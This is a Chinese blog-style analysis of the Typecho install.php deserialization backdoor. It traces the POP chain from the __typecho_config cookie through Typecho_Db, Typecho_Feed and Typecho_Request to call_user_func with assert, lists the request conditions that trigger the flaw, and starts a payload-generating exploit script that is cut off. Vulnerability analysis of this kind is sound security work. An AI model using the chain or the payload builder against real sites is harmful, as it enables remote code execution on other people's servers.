@@ -1,0 +1,311 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Install.php 代码分析</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Install.php 代码分析</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484282&amp;idx=2&amp;sn=4b915c56ef6a886da6848eaedc009455&amp;chksm=ec6fe47adb186d6c18385e8bb8dab1e161715080e930289f120726a4b7c31e45ea17031bed95&amp;scene=126&amp;sessionid=1681378750#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484282&amp;idx=2&amp;sn=4b915c56ef6a886da6848eaedc009455&amp;chksm=ec6fe47adb186d6c18385e8bb8dab1e161715080e930289f120726a4b7c31e45ea17031bed95&amp;scene=126&amp;sessionid=1681378750#rd</a></blockquote><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">前言</h3><p style="margin-bottom: 1.2em !important;">有一天凌晨听其他师傅说typecho留了后门，因为吃鸡太晚了就没看。后面想分析的时候，后发现原文章没了，搜索引擎的缓存都是乱的。。。。找了好久也没有找到，于是问了下其他看过的师傅漏洞位置，根据杂乱的缓存，就自己操刀子了 。</p><p style="margin-bottom: 1.2em !important;">问题源头在<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">install.php</code>，它在安装后是不会删除的，这里就是恶意代码的输入点</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">0x01 操作执行顺序：</h3><ol style="" class=" list-paddingleft-2"><li><p>base64解码后反序列化cookie中传入的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__typecho_config</code>参数，</p></li><li><p>然后让<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__typecho_config</code>作为构造参数例化一个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Db</code>类，</p></li><li><p>接着通过<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">POP</code>链进行代码执行。</p></li></ol><p style="margin-bottom: 1.2em !important;"><strong>涉及到的文件还有类名</strong></p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">install.php（unserialize） - &gt;  Db.php（class Typecho_Db）  - &gt;  Feed.php （class Typecho_Feed） - &gt;  Request.php （class Typecho_Request）</code></pre><p style="margin-bottom: 1.2em !important;"><strong>install.php</strong></p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">进入这段代码的条件：</h4><ol style="" class=" list-paddingleft-2"><li><p>设置了正确的referer（网站url即可）</p></li><li><p>加上一个任意的finish参数</p></li><li><p>设置cookie中<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__typecho_config</code>字段的值</p></li></ol><p style="margin-bottom: 1.2em !important;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">cookie</code>中的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__typecho_config</code>得到序列化后的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$config</code>数组字符串后，再使用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$config['adapter']</code>作为构造参数传入<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Db</code>的实例化过程</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">            &lt;?php if (isset($_GET['finish'])) : ?&gt;
+                &lt;?php if (!@file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php')) : ?&gt;
+                &lt;h1 class="typecho-install-title"&gt;&lt;?php _e('安装失败!'); ?&gt;&lt;/h1&gt;
+                &lt;div class="typecho-install-body"&gt;
+                    &lt;form method="post" action="?config" name="config"&gt;
+                    &lt;p class="message error"&gt;&lt;?php _e('您没有上传 config.inc.php 文件，请您重新安装！'); ?&gt; &lt;button class="btn primary" type="submit"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+                &lt;?php elseif (!Typecho_Cookie::get('__typecho_config')): ?&gt;
+                &lt;h1 class="typecho-install-title"&gt;&lt;?php _e('没有安装!'); ?&gt;&lt;/h1&gt;
+                &lt;div class="typecho-install-body"&gt;
+                    &lt;form method="post" action="?config" name="config"&gt;
+                    &lt;p class="message error"&gt;&lt;?php _e('您没有执行安装步骤，请您重新安装！'); ?&gt; &lt;button class="btn primary" type="submit"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+                &lt;?php else : ?&gt;
+                    &lt;?php
+                    $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
+                    Typecho_Cookie::delete('__typecho_config');
+                    $db = new Typecho_Db($config['adapter'], $config['prefix']);
+                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
+                    Typecho_Db::set($db);
+                    ?&gt;</code></pre><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: rgb(238, 238, 238);">Db.php</h2><p style="margin-bottom: 1.2em !important;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$config['adapter']</code>在构造函数里面对应形参<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$adapterName</code>,<br/><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$adapterName</code>是<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Feed</code>类的实例，使用.字符连接就调用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__toString</code>魔术方法</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    public function __construct($adapterName, $prefix = 'typecho_')
+    {
+        /** 获取适配器名称 */
+        $this-&gt;_adapterName = $adapterName;
+
+        /** 数据库适配器 */
+        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
+
+        if (!call_user_func(array($adapterName, 'isAvailable'))) {
+            throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");
+        }
+
+        $this-&gt;_prefix = $prefix;
+
+        /** 初始化内部变量 */
+        $this-&gt;_pool = array();
+        $this-&gt;_connectedPool = array();
+        $this-&gt;_config = array();
+
+        //实例化适配器对象
+        $this-&gt;_adapter = new $adapterName();
+    }</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">Feed.php</h4><p style="margin-bottom: 1.2em !important;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$this-&gt;_type</code>用来控制if语句的流程，给<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$this-&gt;_type</code>赋值 <code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">ATOM 1.0</code>时，<br/>即可进入包含<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$item['author']-&gt;screenName</code>的分支，<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$item['author']</code>这个变量是一个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Request</code>的实例,我们可以设置这个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Request</code>实例的属性<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">screenName</code>是一个私有属性，<br/>当访问<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$item['author']-&gt;screenName</code>就会调用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__get</code>方法</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    public function __toString()
+    {
+        $result = '&lt;?xml version="1.0" encoding="' . $this-&gt;_charset . '"?&gt;' . self::EOL;
+
+        if (self::RSS1 == $this-&gt;_type) {
+            $result .= '&lt;rdf:RDF
+xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+xmlns="http://purl.org/rss/1.0/"
+xmlns:dc="http://purl.org/dc/elements/1.1/"&gt;' . self::EOL;
+
+            $content = '';
+            $links = array();
+            $lastUpdate = 0;
+
+            foreach ($this-&gt;_items as $item) {
+                $content .= '&lt;item rdf:about="' . $item['link'] . '"&gt;' . self::EOL;
+                $content .= '&lt;title&gt;' . htmlspecialchars($item['title']) . '&lt;/title&gt;' . self::EOL;
+                $content .= '&lt;link&gt;' . $item['link'] . '&lt;/link&gt;' . self::EOL;
+                $content .= '&lt;dc:date&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/dc:date&gt;' . self::EOL;
+                $content .= '&lt;description&gt;' . strip_tags($item['content']) . '&lt;/description&gt;' . self::EOL;
+                if (!empty($item['suffix'])) {
+                    $content .= $item['suffix'];
+                }
+                $content .= '&lt;/item&gt;' . self::EOL;
+
+                $links[] = $item['link'];
+
+                if ($item['date'] &gt; $lastUpdate) {
+                    $lastUpdate = $item['date'];
+                }
+            }
+
+            $result .= '&lt;channel rdf:about="' . $this-&gt;_feedUrl . '"&gt;
+&lt;title&gt;' . htmlspecialchars($this-&gt;_title) . '&lt;/title&gt;
+&lt;link&gt;' . $this-&gt;_baseUrl . '&lt;/link&gt;
+&lt;description&gt;' . htmlspecialchars($this-&gt;_subTitle) . '&lt;/description&gt;
+&lt;items&gt;
+&lt;rdf:Seq&gt;' . self::EOL;
+
+            foreach ($links as $link) {
+                $result .= '&lt;rdf:li resource="' . $link . '"/&gt;' . self::EOL;
+            }
+
+            $result .= '&lt;/rdf:Seq&gt;
+&lt;/items&gt;
+&lt;/channel&gt;' . self::EOL;
+
+            $result .= $content . '&lt;/rdf:RDF&gt;';
+
+        } else if (self::RSS2 == $this-&gt;_type) {
+            $result .= '&lt;rss version="2.0"
+xmlns:content="http://purl.org/rss/1.0/modules/content/"
+xmlns:dc="http://purl.org/dc/elements/1.1/"
+xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+xmlns:atom="http://www.w3.org/2005/Atom"
+xmlns:wfw="http://wellformedweb.org/CommentAPI/"&gt;
+&lt;channel&gt;' . self::EOL;
+
+            $content = '';
+            $lastUpdate = 0;
+
+            foreach ($this-&gt;_items as $item) {
+                $content .= '&lt;item&gt;' . self::EOL;
+                $content .= '&lt;title&gt;' . htmlspecialchars($item['title']) . '&lt;/title&gt;' . self::EOL;
+                $content .= '&lt;link&gt;' . $item['link'] . '&lt;/link&gt;' . self::EOL;
+                $content .= '&lt;guid&gt;' . $item['link'] . '&lt;/guid&gt;' . self::EOL;
+                $content .= '&lt;pubDate&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/pubDate&gt;' . self::EOL;
+                $content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL;
+
+                if (!empty($item['category']) &amp;&amp; is_array($item['category'])) {
+                    foreach ($item['category'] as $category) {
+                        $content .= '&lt;category&gt;&lt;![CDATA[' . $category['name'] . ']]&gt;&lt;/category&gt;' . self::EOL;
+                    }
+                }
+
+                if (!empty($item['excerpt'])) {
+                    $content .= '&lt;description&gt;&lt;![CDATA[' . strip_tags($item['excerpt']) . ']]&gt;&lt;/description&gt;' . self::EOL;
+                }
+
+                if (!empty($item['content'])) {
+                    $content .= '&lt;content:encoded xml:lang="' . $this-&gt;_lang . '"&gt;&lt;![CDATA['
+                    . self::EOL .
+                    $item['content'] . self::EOL .
+                    ']]&gt;&lt;/content:encoded&gt;' . self::EOL;
+                }
+
+                if (isset($item['comments']) &amp;&amp; strlen($item['comments']) &gt; 0) {
+                    $content .= '&lt;slash:comments&gt;' . $item['comments'] . '&lt;/slash:comments&gt;' . self::EOL;
+                }
+
+                $content .= '&lt;comments&gt;' . $item['link'] . '#comments&lt;/comments&gt;' . self::EOL;
+                if (!empty($item['commentsFeedUrl'])) {
+                    $content .= '&lt;wfw:commentRss&gt;' . $item['commentsFeedUrl'] . '&lt;/wfw:commentRss&gt;' . self::EOL;
+                }
+
+                if (!empty($item['suffix'])) {
+                    $content .= $item['suffix'];
+                }
+
+                $content .= '&lt;/item&gt;' . self::EOL;
+
+                if ($item['date'] &gt; $lastUpdate) {
+                    $lastUpdate = $item['date'];
+                }
+            }
+
+            $result .= '&lt;title&gt;' . htmlspecialchars($this-&gt;_title) . '&lt;/title&gt;
+&lt;link&gt;' . $this-&gt;_baseUrl . '&lt;/link&gt;
+&lt;atom:link href="' . $this-&gt;_feedUrl . '" rel="self" type="application/rss+xml" /&gt;
+&lt;language&gt;' . $this-&gt;_lang . '&lt;/language&gt;
+&lt;description&gt;' . htmlspecialchars($this-&gt;_subTitle) . '&lt;/description&gt;
+&lt;lastBuildDate&gt;' . $this-&gt;dateFormat($lastUpdate) . '&lt;/lastBuildDate&gt;
+&lt;pubDate&gt;' . $this-&gt;dateFormat($lastUpdate) . '&lt;/pubDate&gt;' . self::EOL;
+
+            $result .= $content . '&lt;/channel&gt;
+&lt;/rss&gt;';
+
+        } else if (self::ATOM1 == $this-&gt;_type) {
+            $result .= '&lt;feed xmlns="http://www.w3.org/2005/Atom"
+xmlns:thr="http://purl.org/syndication/thread/1.0"
+xml:lang="' . $this-&gt;_lang . '"
+xml:base="' . $this-&gt;_baseUrl . '"
+&gt;' . self::EOL;
+
+            $content = '';
+            $lastUpdate = 0;
+
+            foreach ($this-&gt;_items as $item) {
+                $content .= '&lt;entry&gt;' . self::EOL;
+                $content .= '&lt;title type="html"&gt;&lt;![CDATA[' . $item['title'] . ']]&gt;&lt;/title&gt;' . self::EOL;
+                $content .= '&lt;link rel="alternate" type="text/html" href="' . $item['link'] . '" /&gt;' . self::EOL;
+                $content .= '&lt;id&gt;' . $item['link'] . '&lt;/id&gt;' . self::EOL;
+                $content .= '&lt;updated&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/updated&gt;' . self::EOL;
+                $content .= '&lt;published&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/published&gt;' . self::EOL;
+                $content .= '&lt;author&gt;
+    &lt;name&gt;' . $item['author']-&gt;screenName . '&lt;/name&gt;
+    &lt;uri&gt;' . $item['author']-&gt;url . '&lt;/uri&gt;
+&lt;/author&gt;' . self::EOL;</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;">Request.php</h4><p style="margin-bottom: 1.2em !important;">Typecho_Request实例调用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__get</code>魔术方法，进入<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">get</code>方法,最后进入<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">_applyFilter</code>方法</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    public function __get($key)
+    {
+        return $this-&gt;get($key);
+    }</code></pre><p style="margin-bottom: 1.2em !important;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$key</code>的值是<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">screenNamem</code>,因此<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$this-&gt;_params</code>需要是个键为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">screenNamem</code>的数组，键值为想执行的代码,最终<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$value</code>传进<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">call_user_func</code></p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    public function get($key, $default = NULL)
+    {
+        switch (true) {
+            case isset($this-&gt;_params[$key]):
+                $value = $this-&gt;_params[$key];
+                break;
+            case isset(self::$_httpParams[$key]):
+                $value = self::$_httpParams[$key];
+                break;
+            default:
+                $value = $default;
+                break;
+        }
+
+        $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;
+        return $this-&gt;_applyFilter($value);
+    }</code></pre><p style="margin-bottom: 1.2em !important;">进入<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">_applyFilter</code>后,可以看见<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">call_user_func</code>，这时需要设置<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$this-&gt;_filter</code>为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">arrsert</code>，作为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">call_user_func</code>的第一个参数，<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$value</code>我们也可控，已经可以执行任意代码</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+    private function _applyFilter($value)
+    {
+        if ($this-&gt;_filter) {
+            foreach ($this-&gt;_filter as $filter) {
+                $value = is_array($value) ? array_map($filter, $value) :
+                call_user_func($filter, $value);
+            }
+
+            $this-&gt;_filter = array();
+        }
+
+        return $value;
+    }</code></pre><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">EXP</h3><p style="margin-bottom: 1.2em !important;">主要用于生成<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">__typecho_config</code>的Payload</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+
+/**
+* Created by PhpStorm.
+* User: RaI4over
+* Date: 2017/10/19
+* Time: 15:17
+* 生成 _typecho_config 的值
+*/
+class Typecho_Feed
+{
+    const RSS2 = 'RSS 2.0';
+    private $_type;
+    private $_charset;
+    private $_lang;
+    private $_items = array();
+
+    public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en')
+    {
+        $this-&gt;_version = $version;
+        $this-&gt;_type = $type;
+        $this-&gt;_charset = $charset;
+        $this-&gt;_lang = $lang;
+    }
+
+    public function addItem(array $item)
+    {
+        $this-&gt;_items[] = $item;
+    }
+}
+
+class Typecho_Request
+{
